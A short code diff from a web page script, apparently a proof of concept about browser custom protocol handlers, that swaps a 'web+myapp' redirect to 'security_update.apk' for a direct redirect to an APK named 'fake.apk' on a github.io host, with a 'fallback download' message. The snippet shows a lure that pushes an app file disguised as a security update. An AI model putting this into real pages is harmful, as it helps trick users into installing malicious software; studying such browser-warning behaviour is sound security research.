@@ -201,7 +201,7 @@
           // This will show Chrome's security dialog:
           // "Open web+myapp links in [oxfat.github.io]?"
           // ORIGIN IS VISIBLE TO USER
-          window.location.href = 'web+myapp://download/security_update.apk';
+          window.location.href = 'https://oxfat.github.io/fake.apk';
         } catch (e) {
           console.error("Protocol trigger failed:", e);
           statusEl.textContent = "⚠️ Protocol trigger failed. Using fallback download...";
